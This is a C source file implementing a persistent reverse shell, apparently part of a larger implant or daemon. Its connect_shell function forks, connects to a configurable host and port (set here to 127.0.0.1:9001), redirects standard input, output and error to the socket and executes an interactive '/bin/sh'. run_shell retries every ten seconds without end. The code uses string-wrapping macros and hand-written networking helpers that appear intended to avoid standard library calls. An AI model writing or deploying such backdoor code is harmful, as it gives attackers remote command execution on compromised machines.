#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <wait.h>

#include "daemon.h"
#include "syscall.h"

#define HOST_ADDR "127.0.0.1"
#define HOST_PORT 9001

static int sleep_sec(int seconds) {
	struct timespec req = {
		.tv_sec = seconds,
		.tv_nsec = 0
	};

	while (nanosleep(&req, &req) == -1) {
		if (g_errno != EINTR) {
			return -1;
		}
	}

	return 0;
}

static int my_htons(int port) {
	return ((port & 0xff) << 8) | ((port & 0xff00) >> 8);
}

static in_addr_t my_inet_addr(const char *ip) {
	in_addr_t result = 0;
	uint32_t byte = 0;
	int dots = 0;


	if (!*ip) {
		return INADDR_NONE;
	}

	while (*ip) {
		if (*ip >= '0' && *ip <= '9') {
			byte = byte * 10 + (*ip - '0');
			if (byte > 255) {
				return INADDR_NONE;
			}
		} else if (*ip == '.') {
			if (++dots > 3) {
				return INADDR_NONE;
			}
			result = (result << 8) | byte;
			byte = 0;
		} else {
			return INADDR_NONE;
		}

		ip++;
	}

	if (dots != 3) {
		return INADDR_NONE;
	}

	result = (result << 8) | byte;
	return __builtin_bswap32(result);
}

int connect_shell(char **envp) {
	pid_t pid;

	pid = fork();

	if (pid == 0) {
		int sockt = socket(AF_INET, SOCK_STREAM, 0);
		if (sockt == -1) {
			logger(STR("failed to create socket\n"));
			exit(1);
		}

		struct sockaddr_in revsockaddr = {
			.sin_family = AF_INET,
			.sin_port = my_htons(HOST_PORT),
			.sin_addr.s_addr = my_inet_addr(STR(HOST_ADDR))
		};


		if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) == -1) {
			close(sockt);
			logger(STR("failed to connect to server\n"));
			exit(1);
		}

		logger(STR("server connected\n"));

		dup2(sockt, 0);
		dup2(sockt, 1);
		dup2(sockt, 2);

		char * const argv[] = {STR("/bin/sh"), STR("-i"), NULL};
		execve(argv[0], argv, envp);
		exit(0);

	} else if (pid > 0) {
		siginfo_t info;
		waitid(P_PID, pid, &info, WEXITED);
		logger(STR("shell process exited\n"));
		return (info.si_status == 0) ? 0 : 1;
	}
	return -1;
}

void run_shell(char **envp) {

	logger(STR("starting reverse shell\n"));
	while (1) {
		connect_shell(envp);
		sleep_sec(10);
	}
}
